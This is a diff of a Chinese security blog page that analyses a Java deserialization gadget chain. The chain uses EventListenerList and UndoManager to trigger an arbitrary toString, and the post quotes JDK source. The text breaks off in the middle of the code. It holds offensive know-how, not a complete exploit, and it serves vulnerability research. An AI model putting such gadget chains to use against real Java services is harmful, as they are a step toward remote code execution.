@@ -1,220 +1,684 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>EventListenerList触发任意toString | LvYz的小窝</title><meta name="author" content="LvYz"><meta name="copyright" content="LvYz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="EventListenerList触发任意toString之前提到fastjson原生反序列化的时候，那一条链子是通过触发jsonArray的toString方法开始的，这里讲一条新的链子（之前使用的是最经典的BadAttributeValueExpException作为toString的入口） 分析过程javax.swing.event.EventListenerList#readObjectp">
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="LvYz">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="EventListenerList触发任意toString之前提到fastjson原生反序列化的时候，那一条链子是通过触发jsonArray的toString方法开始的，这里讲一条新的链子（之前使用的是最经典的BadAttributeValueExpException作为toString的入口） 分析过程javax.swing.event.EventListenerList#readObject1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="EventListenerList触发任意toString">
 <meta property="og:url" content="https://lvyzcc.github.io/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/index.html">
 <meta property="og:site_name" content="LvYz的小窝">
-<meta property="og:description" content="EventListenerList触发任意toString之前提到fastjson原生反序列化的时候，那一条链子是通过触发jsonArray的toString方法开始的，这里讲一条新的链子（之前使用的是最经典的BadAttributeValueExpException作为toString的入口） 分析过程javax.swing.event.EventListenerList#readObjectp">
+<meta property="og:description" content="EventListenerList触发任意toString之前提到fastjson原生反序列化的时候，那一条链子是通过触发jsonArray的toString方法开始的，这里讲一条新的链子（之前使用的是最经典的BadAttributeValueExpException作为toString的入口） 分析过程javax.swing.event.EventListenerList#readObject1">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lvyzcc.github.io/img/avatar.jpg">
 <meta property="article:published_time" content="2025-04-19T05:54:49.000Z">
 <meta property="article:modified_time" content="2025-04-19T06:37:42.844Z">
 <meta property="article:author" content="LvYz">
 <meta property="article:tag" content="JAVA">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://lvyzcc.github.io/img/avatar.jpg"><script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "EventListenerList触发任意toString",
-  "url": "https://lvyzcc.github.io/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/",
-  "image": "https://lvyzcc.github.io/img/avatar.jpg",
-  "datePublished": "2025-04-19T05:54:49.000Z",
-  "dateModified": "2025-04-19T06:37:42.844Z",
-  "author": [
-    {
-      "@type": "Person",
-      "name": "LvYz",
-      "url": "https://lvyzcc.github.io/"
-    }
-  ]
-}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lvyzcc.github.io/2025/04/19/EventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
-    (() => {
-      
-    const saveToLocal = {
-      set: (key, value, ttl) => {
-        if (!ttl) return
-        const expiry = Date.now() + ttl * 86400000
-        localStorage.setItem(key, JSON.stringify({ value, expiry }))
-      },
-      get: key => {
-        const itemStr = localStorage.getItem(key)
-        if (!itemStr) return undefined
-        const { value, expiry } = JSON.parse(itemStr)
-        if (Date.now() > expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return value
-      }
-    }
-
-    window.btf = {
-      saveToLocal,
-      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
-        script.onload = script.onreadystatechange = () => {
-          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
-        }
-        script.onerror = reject
-        document.head.appendChild(script)
-      }),
-      getCSS: (url, id) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onload = link.onreadystatechange = () => {
-          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
-        }
-        link.onerror = reject
-        document.head.appendChild(link)
-      }),
-      addGlobalFn: (key, fn, name = false, parent = window) => {
-        if (!false && key.startsWith('pjax')) return
-        const globalFn = parent.globalFn || {}
-        globalFn[key] = globalFn[key] || {}
-        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
-        parent.globalFn = globalFn
-      }
-    }
+<meta name="twitter:card" content="summary_large_image">
   
-      
-      const activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      const activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
+  
+  
+  <title>EventListenerList触发任意toString - LvYz的小窝</title>
 
-      btf.activateDarkMode = activateDarkMode
-      btf.activateLightMode = activateLightMode
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
-      const theme = saveToLocal.get('theme')
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lvyzcc.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
     
-          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>LvYzCc</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="EventListenerList触发任意toString"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-19 13:54" pubdate>
+          2025年4月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
       
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
-      }
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
     
       
-    const detectApple = () => {
-      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-  
-    })()
-  </script><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
-  copy: {
-    success: '复制成功',
-    error: '复制失败',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'null',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyloadPlugin: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'EventListenerList触发任意toString',
-  isHighlightShrink: false,
-  isToc: true,
-  pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
-  const $loadingBox = document.getElementById('loading-box')
-  const $body = document.body
-  const preloader = {
-    endLoading: () => {
-      $body.style.overflow = ''
-      $loadingBox.classList.add('loaded')
-    },
-    initLoading: () => {
-      $body.style.overflow = 'hidden'
-      $loadingBox.classList.remove('loaded')
-    }
-  }
 
-  preloader.initLoading()
-  window.addEventListener('load', preloader.endLoading)
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
 
-  if (false) {
-    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
-    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
-  }
-})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">LvYz的小窝</span></a><a class="nav-page-title" href="/"><span class="site-name">EventListenerList触发任意toString</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">EventListenerList触发任意toString</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-19T05:54:49.000Z" title="发表于 2025-04-19 13:54:49">2025-04-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-19T06:37:42.844Z" title="更新于 2025-04-19 14:37:42">2025-04-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="EventListenerList触发任意toString"><a href="#EventListenerList触发任意toString" class="headerlink" title="EventListenerList触发任意toString"></a>EventListenerList触发任意toString</h2><p>之前提到fastjson原生反序列化的时候，那一条链子是通过触发<code>jsonArray</code>的<code>toString</code>方法开始的，这里讲一条新的链子（之前使用的是最经典的<code>BadAttributeValueExpException</code>作为toString的入口）</p>
-<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><h4 id="javax-swing-event-EventListenerList-readObject"><a href="#javax-swing-event-EventListenerList-readObject" class="headerlink" title="javax.swing.event.EventListenerList#readObject"></a>javax.swing.event.EventListenerList#readObject</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        listenerList = NULL_ARRAY;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        Object listenerTypeOrNull;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">null</span> != (listenerTypeOrNull = s.readObject())) &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">EventListener</span> <span class="variable">l</span> <span class="operator">=</span> (EventListener)s.readObject();</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) listenerTypeOrNull;</span><br><span class="line">            ReflectUtil.checkPackageAccess(name);</span><br><span class="line">            add((Class&lt;EventListener&gt;)Class.forName(name, <span class="literal">true</span>, cl), l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">EventListenerList触发任意toString</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="EventListenerList触发任意toString"><a href="#EventListenerList触发任意toString" class="headerlink" title="EventListenerList触发任意toString"></a>EventListenerList触发任意toString</h2><p>之前提到fastjson原生反序列化的时候，那一条链子是通过触发<code>jsonArray</code>的<code>toString</code>方法开始的，这里讲一条新的链子（之前使用的是最经典的<code>BadAttributeValueExpException</code>作为toString的入口）</p>
+<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><h4 id="javax-swing-event-EventListenerList-readObject"><a href="#javax-swing-event-EventListenerList-readObject" class="headerlink" title="javax.swing.event.EventListenerList#readObject"></a>javax.swing.event.EventListenerList#readObject</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        listenerList = NULL_ARRAY;<br>        s.defaultReadObject();<br>        Object listenerTypeOrNull;<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">null</span> != (listenerTypeOrNull = s.readObject())) &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            <span class="hljs-type">EventListener</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> (EventListener)s.readObject();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) listenerTypeOrNull;<br>            ReflectUtil.checkPackageAccess(name);<br>            add((Class&lt;EventListener&gt;)Class.forName(name, <span class="hljs-literal">true</span>, cl), l);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>其中的s这里会有一个强转要求是<code>EventListener</code>接口。</p>
 <p>我们先看看他是否可控，在EventListener的writeObject中s是可控的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Object[] lList = listenerList;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Save the non-null event listeners:</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; lList.length; i+=<span class="number">2</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; t = (Class)lList[i];</span><br><span class="line">            <span class="type">EventListener</span> <span class="variable">l</span> <span class="operator">=</span> (EventListener)lList[i+<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ((l!=<span class="literal">null</span>) &amp;&amp; (l <span class="keyword">instanceof</span> Serializable)) &#123;</span><br><span class="line">                s.writeObject(t.getName());</span><br><span class="line">                s.writeObject(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s.writeObject(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Object[] lList = listenerList;<br>        s.defaultWriteObject();<br><br>        <span class="hljs-comment">// Save the non-null event listeners:</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; lList.length; i+=<span class="hljs-number">2</span>) &#123;<br>            Class&lt;?&gt; t = (Class)lList[i];<br>            <span class="hljs-type">EventListener</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> (EventListener)lList[i+<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> ((l!=<span class="hljs-literal">null</span>) &amp;&amp; (l <span class="hljs-keyword">instanceof</span> Serializable)) &#123;<br>                s.writeObject(t.getName());<br>                s.writeObject(l);<br>            &#125;<br>        &#125;<br><br>        s.writeObject(<span class="hljs-literal">null</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>这里使用UndoManager类，它实现了<code>UndoableEditListener</code>接口，<code>UndoableEditListener</code>接口继承了<code>EventListener</code>类，<code>UndoManager</code>类也继承了<code>CompoundEdit</code>类，向上继承了<code>AbstractUndoableEdit</code>类，这个类继承了<code>Serializable</code>接口。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T <span class="keyword">extends</span> <span class="title class_">EventListener</span>&gt; <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Class&lt;T&gt; t, T l)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l==<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// In an ideal world, we would do an assertion here</span></span><br><span class="line">            <span class="comment">// to help developers know they are probably doing</span></span><br><span class="line">            <span class="comment">// something wrong</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!t.isInstance(l)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Listener &quot;</span> + l +</span><br><span class="line">                                         <span class="string">&quot; is not of type &quot;</span> + t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (listenerList == NULL_ARRAY) &#123;</span><br><span class="line">            <span class="comment">// if this is the first listener added,</span></span><br><span class="line">            <span class="comment">// initialize the lists</span></span><br><span class="line">            listenerList = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; t, l &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Otherwise copy the array and add the new listener</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> listenerList.length;</span><br><span class="line">            Object[] tmp = <span class="keyword">new</span> <span class="title class_">Object</span>[i+<span class="number">2</span>];</span><br><span class="line">            System.arraycopy(listenerList, <span class="number">0</span>, tmp, <span class="number">0</span>, i);</span><br><span class="line"></span><br><span class="line">            tmp[i] = t;</span><br><span class="line">            tmp[i+<span class="number">1</span>] = l;</span><br><span class="line"></span><br><span class="line">            listenerList = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">EventListener</span>&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(Class&lt;T&gt; t, T l)</span> &#123;<br>        <span class="hljs-keyword">if</span> (l==<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// In an ideal world, we would do an assertion here</span><br>            <span class="hljs-comment">// to help developers know they are probably doing</span><br>            <span class="hljs-comment">// something wrong</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!t.isInstance(l)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Listener &quot;</span> + l +<br>                                         <span class="hljs-string">&quot; is not of type &quot;</span> + t);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (listenerList == NULL_ARRAY) &#123;<br>            <span class="hljs-comment">// if this is the first listener added,</span><br>            <span class="hljs-comment">// initialize the lists</span><br>            listenerList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; t, l &#125;;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Otherwise copy the array and add the new listener</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> listenerList.length;<br>            Object[] tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[i+<span class="hljs-number">2</span>];<br>            System.arraycopy(listenerList, <span class="hljs-number">0</span>, tmp, <span class="hljs-number">0</span>, i);<br><br>            tmp[i] = t;<br>            tmp[i+<span class="hljs-number">1</span>] = 